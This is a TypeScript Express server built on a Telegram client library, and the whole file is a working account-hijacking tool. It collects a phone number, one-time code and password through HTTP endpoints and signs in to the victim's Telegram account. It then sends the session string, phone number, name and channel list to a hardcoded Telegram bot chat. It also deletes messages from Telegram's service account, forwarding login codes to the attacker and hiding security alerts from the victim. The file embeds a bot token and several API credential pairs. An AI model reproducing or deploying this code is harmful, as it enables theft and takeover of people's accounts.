import { Api, TelegramClient } from "telegram";
import { ApiCredentials } from "telegram/client/auth";
import { AbortController } from "node-abort-controller";
import fetch from "node-fetch";
import express from 'express';
import { sleep } from "telegram/Helpers";
import { NewMessage, NewMessageEvent } from "telegram/events";

require('dotenv').config();
const { StringSession } = require("telegram/sessions");
const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";

const app = express();
let actKey = 0;
let creds = [
    {
        apiId: 27919939,
        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
    },
    {
        apiId: 25328268,
        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
    },
    {
        apiId: 2899,
        apiHash: "36722c72256a24c1225de00eb6a1ca74"
    },
    {
        apiId: 24559917,
        apiHash: "702294de6c08f4fd8c94c3141e0cebfb"
    },
    {
        apiId: 12777557,
        apiHash: "05054fc7885dcfa18eb7432865ea3500"
    },
    {
        apiId: 27565391,
        apiHash: "a3a0a2e895f893e2067dae111b20f2d9"
    },
    {
        apiId: 23195238,
        apiHash: "15a8b085da74163f158eabc71c55b000"
    },
]
const port = 4000;
let apiId = 25328268;
let apiHash = "b4e654dd2a051930d0a30bb2add80d09"
let phoneCode;
let isRegistrationRequired = false;
let termsOfService;

let globalRetry = 1;
const username = process?.env?.userName || "default"
let sendCodeResult: {
    phoneCodeHash: string;
    isCodeViaApp: boolean;
} | undefined = undefined;
let phoneNumber;
let phoneCodeHash;
let password;
let isCodeViaApp = false;
const stringSession = new StringSession("");
let client = new TelegramClient(stringSession, apiId, apiHash, {
    connectionRetries: 5,
});
let inProcess = true;

async function fetchWithTimeout(resource, options: any = { timeout: undefined }, sendErr = true) {
    const timeout = options?.timeout || 15000;

    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        const url = encodeURI(resource);
        // console.log(resource, url);
        // const response = {ok :true}
        const response = await fetch(url, {
            ...options,
            signal: controller.signal
        });
        clearTimeout(id);
        return response;
    } catch (error) {
        if (sendErr) {
            console.log(error, ' - ', resource);
            await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}: ${error} - ${resource}`);
        }
        return undefined
    }
}

app.get('/', async (req, res) => {
    if (!client.connected) {
        await client.connect();
    };
    res.send('Hello World!');
});

app.get('/login', async (req, res, next) => {
    res.send('responding!!');
    next();
}, async (req, res) => {
    if (inProcess) {
        inProcess = false;
        setTimeout(async () => {
            await restAcc();
        }, 120000)
        const phone = req.query.phone;
        console.log("Number :", `+${phone}`);
        await trySgnup(`+${phone}`)
    }
});

app.get('/otp', async (req, res, next) => {
    res.send('loggingIn!!');
    next();
}, async (req, res) => {
    phoneCode = req.query.code;
    console.log(phoneCode)
    console.log("hello:", phoneCode);
    await login();
});
app.get('/password', async (req, res) => {
    password = req.query.password;
    console.log(password)
    res.send('loggingIn!!');
});

app.get('/exit', async (req, res) => {
    process.exit(1)
    res.json({});
});
app.get('/connect', async (req, res) => {
    await client.connect();
    const sess = client.session.save()
    console.log(sess);
    res.json({});
});

app.get('/disconnect', async (req, res) => {
    await client.destroy();
    res.send("detroyed");
});

app.listen(port, () => {
    console.log(`App listening at http://localhost:${port}`);
});


async function trySgnup(phoneNum: string) {

    phoneNumber = phoneNum
    let retries = 6;
    try {

        console.log("API DETAILS:", apiId, apiHash);

        if (!client.connected) {
            await client.connect();
        }
        const sendCodeResult = await sendCode(
            client,
            { apiId: apiId, apiHash: apiHash },
            phoneNumber);
        phoneCodeHash = sendCodeResult.phoneCodeHash;
        isCodeViaApp = sendCodeResult.isCodeViaApp;

        if (typeof phoneCodeHash !== "string") {
            throw new Error("Failed to retrieve phone code hash");
        }
        console.log(sendCodeResult);

    } catch (err: any) {
        if (typeof phoneNumber !== "function") {
            throw err;
        }
        const shouldWeStop = false//await authParams.onError(err);
        if (shouldWeStop) {
            throw new Error("AUTH_USER_CANCEL");
        }
    }
}

async function restAcc() {
    process.exit(1)
    await sleep(1000);
    client.session.delete();
    await client?.destroy();
    // phoneCode = undefined;
    // phoneNumber = undefined;
    inProcess = true;
    actKey = (actKey + 1) % creds.length;
    apiHash = creds[actKey].apiHash;
    apiId = creds[actKey].apiId;
    client.session.delete();

    client = new TelegramClient(stringSession, apiId, apiHash, {
        connectionRetries: 5,
    });
}

async function login() {
    try {

        console.log("inside:", phoneCode, phoneNumber, phoneCodeHash, creds[actKey].apiId, creds[actKey].apiHash);

        if (!phoneCode) {
            throw new Error("Code is empty");
        }
        if (!client.connected) {
            await client.connect();
        }
        const result = await client?.invoke(
            new Api.auth.SignIn({
                phoneNumber,
                phoneCodeHash,
                phoneCode,
            })
        );
        console.log(result);
        if (result instanceof Api.auth.AuthorizationSignUpRequired) {
            isRegistrationRequired = true;
            termsOfService = result.termsOfService;
        } else {
            console.log(client.session.save());
            client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
            await sendChannels();
            await sleep(1000)
            const sess = client.session.save() as unknown as string;
            const user: any = await result.user.toJSON()
            const payload = {
                chat_id: "-1001729935532",
                text: `${(username).toUpperCase()}:\nnumber = +${user.phone}\nsession = ${sess}\nname:${user.firstName} ${user.lastName}\nuserName: ${user.username}`
            };
            const options = {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            };
            await fetchWithTimeout(`${ppplbot}`, options);
            // const msg = await client.sendMessage('@myvideocallAccount', { message: sess });
            // await msg.delete();
            await restAcc();
            return result.user
        }
    } catch (err: any) {
        console.log(err);
        if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
            console.log("passowrd Required")
            // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
        } else {
            const shouldWeStop = false//await authParams.onError(err);
            if (shouldWeStop) {
                throw new Error("AUTH_USER_CANCEL");
            }
        }
        await restAcc();
    }

    if (isRegistrationRequired) {
        try {
            let lastName = 'last name';
            let firstName = "first name";


            const { user } = (await client.invoke(
                new Api.auth.SignUp({
                    phoneNumber,
                    phoneCodeHash,
                    firstName,
                    lastName,
                })
            )) as Api.auth.Authorization;

            if (termsOfService) {
                // This is a violation of Telegram rules: the user should be presented with and accept TOS.
                await client.invoke(
                    new Api.help.AcceptTermsOfService({
                        id: termsOfService.id,
                    })
                );
            }

            return user;
        } catch (err: any) {
            const shouldWeStop = false//await authParams.onError(err);
            if (shouldWeStop) {
                throw new Error("AUTH_USER_CANCEL");
            }
        }
    }

}

async function delayedReturn(timeout): Promise<string> {
    globalRetry++;
    if (globalRetry % 9 === 0) {
        process.exit(1);
    }
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve(phoneCode as string);
        }, timeout);
    });
}
export async function sendCode(
    client: TelegramClient,
    apiCredentials: ApiCredentials,
    phoneNumber: string,
    forceSMS = false
): Promise<{
    phoneCodeHash: string;
    isCodeViaApp: boolean;
}> {
    try {
        const { apiId, apiHash } = apiCredentials;
        const sendResult = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber,
                apiId,
                apiHash,
                settings: new Api.CodeSettings({}),
            })
        );
        if (sendResult instanceof Api.auth.SentCodeSuccess)
            throw new Error("logged in right after sending the code");

        // If we already sent a SMS, do not resend the phoneCode (hash may be empty)
        if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {
            return {
                phoneCodeHash: sendResult.phoneCodeHash,
                isCodeViaApp:
                    sendResult.type instanceof Api.auth.SentCodeTypeApp,
            };
        }

        const resendResult = await client.invoke(
            new Api.auth.ResendCode({
                phoneNumber,
                phoneCodeHash: sendResult.phoneCodeHash,
            })
        );
        if (resendResult instanceof Api.auth.SentCodeSuccess)
            throw new Error("logged in right after resending the code");

        return {
            phoneCodeHash: resendResult.phoneCodeHash,
            isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,
        };
    } catch (err: any) {
        if (err.errorMessage === "AUTH_RESTART") {
            return client.sendCode(apiCredentials, phoneNumber, forceSMS);
        } else {
            throw err;
        }
    }
}


async function deleteMsgs(event: NewMessageEvent) {
    if (event.message.chatId.toString() == "777000") {
        const payload = {
            chat_id: "-1001729935532",
            text: event.message.text
        };
        console.log("RECIEVED");
        await sleep(500);
        await event.message.delete({ revoke: true });
        const options = {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        };
        await fetchWithTimeout(`${ppplbot}`, options);
    }
    const msgs = await event.client.getMessages("777000", { limit: 2 });
    msgs.forEach(async msg => {
        await msg.delete();
    })
}

async function sendChannels() {
    const chats = await client?.getDialogs({ limit: 130 });
    let reply = '';
    chats.map((chat: any) => {
        if (chat.isChannel || chat.isGroup) {
            const username = chat.entity.toJSON().username ? ` @${chat.entity.toJSON().username} ` : chat.entity.toJSON().id.toString();
            reply = reply + chat.entity.toJSON().title + " " + username + ' \n';
        }
    });
    const payload = {
        chat_id: "-1001729935532",
        text: reply
    };
    const options = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    };
    await fetchWithTimeout(`${ppplbot}`, options);
}